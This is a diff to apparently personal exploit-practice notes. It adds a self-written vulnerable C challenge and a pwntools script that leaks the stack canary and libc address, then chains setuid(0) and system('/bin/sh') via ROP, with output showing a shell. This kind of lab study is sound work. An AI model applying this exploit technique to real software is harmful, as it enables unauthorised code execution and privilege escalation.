@@ -1402,7 +1402,7 @@ ret, under the hood, pops from top of stack (rsp should point to top of stack) (
 ---
 
 
-# My own random test chall
+# My own random test chall 1 
 
 
 ```
@@ -1456,5 +1456,142 @@ $ p hack.py; ./a.out < payload
 Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbbbbccccddddeeeeffffggF@how did you get here??
 Segmentation fault         ./a.out < payload
 ```
+
+
+
+<br>
+
+
+<br>
+
+
+<br>
+
+
+
+```
+
+<br>
+
+<br>
+
+
+# My own random test chall 2 (ROP!)
+
+
+```c
+#include <unistd.h>
+#include <stdio.h>
+
+int main() {
+    char input[100];
+    input[0] = 'A';
+
+    printf("Input buffer start: %lx\n", (unsigned long) &input);
+
+    for (int i=0; i<2; i++) {
+        printf("Enter the address you want to leak: ");
+        long leak_input;
+        scanf("%lx", &leak_input);
+        printf("Free leak: %lx\n", *((long*) leak_input));
+    }
+
+    printf("payload: ");
+    read(0, &input, 200);
+}
+```
+
+
+
+<br>
+
+
+```python
+from pwn import *
+
+libc = ELF('/usr/lib/libc.so.6')
+
+
+
+p = process('./chall')
+n = 0x70
+
+print(p.recvuntil(b'Input buffer start: '))
+input_buffer_start = int(p.recv().strip().decode(), 16)
+print(f'{input_buffer_start = }')
+rbp = input_buffer_start + n
+print(f'{ p64(rbp)[::-1].hex() = }')
+
+p.sendline(f'{(rbp-8):x}'.encode())
+p.recvuntil(b'Free leak: ')
+canary = int(p.recv().strip(), 16)
+print(f'{hex(canary) = }')
+
+p.sendline(f'{(rbp+8):x}'.encode())
+p.recvuntil(b'Free leak: ')
+ret  = int(p.recv().strip(), 16)
+print(f'{hex(ret) = }')
+
+LIBC_SYSTEM = ret + 184863
+LIBC_BASE = LIBC_SYSTEM - libc.symbols['system']
+LIBC_SETUID = LIBC_BASE + libc.symbols['setuid']
+LIBC_BINSH = LIBC_BASE + next(libc.search(b'/bin/sh'))
+
+RET = p64(LIBC_BASE + 0x199cf8)
+# 0x1964d4: pop rdi ; pop rbp ; ret ; (1 found)
+POP_RDI_POP_RBP_RET = p64(LIBC_BASE + 0x1964d4)
+
+payload = b'A' * (n-8) + p64(canary) + b'oldrbpxx'
+
+# setuid(0)
+payload += POP_RDI_POP_RBP_RET + p64(0) + p64(123)
+payload += RET + p64(LIBC_SETUID)
+
+# system
+payload += POP_RDI_POP_RBP_RET + p64(LIBC_BINSH) + p64(123)
+payload += RET + p64(LIBC_SYSTEM)
+
+p.send(payload)
+p.interactive()
+
+```
+
+
+
+<br>
+
+
+<br>
+
+
+```
+[~/t] 
+$ p solve.py 
+[*] '/usr/lib/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Starting local process './chall': pid 5458
+b'Input buffer start: '
+input_buffer_start = 140730723417152
+ p64(rbp)[::-1].hex() = '00007ffe6cc73cb0'
+hex(canary) = '0x4df0344d05c36c00'
+hex(ret) = '0x7ffa0e227741'
+[*] Switching to interactive mode
+$ whoami
+connor
+$ echo test
+test
+$
+```
+
+
+
+<br>
+
 
 
